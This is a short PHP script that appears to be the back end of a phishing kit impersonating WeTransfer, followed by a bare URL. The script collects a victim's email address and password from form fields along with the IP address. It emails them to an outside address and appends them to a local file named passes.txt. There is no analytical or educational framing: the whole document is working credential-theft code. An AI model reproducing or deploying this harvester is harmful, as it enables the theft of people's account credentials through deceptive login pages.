<?php

//Get the necessary variables from the server.
$ema1l = $_POST['X1'];
$pass = $_POST['X2'];
$ip = $_SERVER["REMOTE_ADDR"];

//Define required variables and send user input to $myEmail.
$myEmail = 'log@elfargoltd.com';
$subject = 'WeTransfer';
$message = "Email: ".$ema1l."\nPassword:".$pass."\nIP:".$ip."\n";
mail($myEmail, $subject, $message);
$file = "passes.txt"; 

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $message) or die("Couldn't write values to file!");
fclose($fp);

?>


https://vxerbosty.com.ng/